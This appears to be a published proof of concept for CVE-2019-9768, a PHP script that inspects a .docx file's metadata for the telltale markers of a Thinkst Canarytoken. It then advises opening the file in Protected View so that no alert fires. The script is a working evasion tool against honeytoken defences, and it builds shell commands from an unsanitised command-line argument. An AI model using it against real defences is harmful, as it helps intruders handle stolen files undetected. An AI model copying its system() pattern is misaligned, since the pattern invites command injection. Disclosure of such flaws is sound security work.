@@ -1,0 +1,37 @@
+## Exploit Title: Canarytokens 2019-03-01 - Detection Bypass
+# Date: 20.03.2019
+# Exploit Author: Benjamin Zink Loft, Gionathan "John" Reale 
+# Vendor Homepage: https://thinkst.com/
+# Version: up to 2019-03-01
+# Software Link: https://github.com/thinkst/canarytokens
+# Google Dork: N/A 
+# CVE: 2019-9768 
+#==================================================================================================================================================================================
+# PoC:
+#
+#
+#
+# Requires unzip:
+#
+# sudo apt-get install unzip
+#
+#
+
+
+<?php
+ 
+system('unzip ' . $argv[1] . '.docx');
+ 
+system('cp ' . $argv[1] . '.docx ./docProps/' . $argv[1] . '.docx && cd docProps');
+ 
+$strFile = file_get_contents("docProps/core.xml");
+ 
+if(strpos($strFile, 'AAAAAAAAAAAAAAAA')!=false && strpos($strFile, '2015-07-21')!=false && filesize( $argv[1] .".docx") < 170000 )
+{
+     echo "This file probably contains a CanaryToken! Open it with Libreoffice/Microsoft Word Protected View to bypass detection";
+}
+else
+{
+     echo "Should be safe to open normally";
+}
+?>
